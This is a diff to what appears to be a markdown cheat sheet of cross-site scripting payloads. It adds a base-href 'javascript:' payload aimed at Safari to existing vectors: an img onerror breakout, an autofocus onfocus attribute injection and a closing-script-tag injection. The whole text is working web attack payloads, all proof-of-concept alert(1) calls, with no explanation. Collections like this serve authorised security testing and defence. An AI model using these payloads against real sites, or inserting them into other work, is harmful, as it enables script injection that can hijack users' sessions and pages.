@@ -1,6 +1,9 @@
 # XSS
 
 ```js
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a><a href>haha</a>
+
+
 "><img src onerror=alert(1)>
 "autofocus onfocus=alert(1)//
 </script><script>alert(1)</script>
